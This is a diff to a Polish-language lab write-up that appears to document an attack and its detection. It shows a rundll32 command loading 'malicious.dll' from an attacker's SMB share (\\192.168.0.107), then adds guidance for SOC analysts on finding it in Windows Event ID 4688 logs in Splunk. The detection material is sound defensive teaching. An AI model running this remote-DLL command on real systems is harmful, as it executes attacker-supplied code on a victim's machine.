@@ -40,3 +40,13 @@ Na stacji roboczej ofiary uruchomiłem wiersz poleceń (cmd.exe), wywołując ru
 * **Komenda (Windows - CMD):**
   ```
   rundll32.exe \\192.168.0.107\share\malicious.dll,EntryPoint
+
+## 4. Analiza logów (Perspektywa braku Sysmona)
+W środowisku pozbawionym agenta Sysmon analityk SOC weryfikuje zdarzenie w Windows Security Event Log (Event ID 4688) przesłanym do Splunk.
+
+Na co patrzeć w strumieniu logów / JSONie:
+*   EventID / EventCode:```4688``` (Utworzono nowy proces).
+*   Nazwa nowego procesu: ```C:\Windows\System32\rundll32.exe```
+*   Nazwa procesu twórcy (Parent): ```C:\Windows\System32\cmd.exe```
+*   Wiersz polecenia (CommandLine): Kluczowy wskaźnik (IOC) – zawiera adres IP serwera atakującego oraz odwołanie do protokołu SMB (```\\192.168.0.107\share\...```).
+  
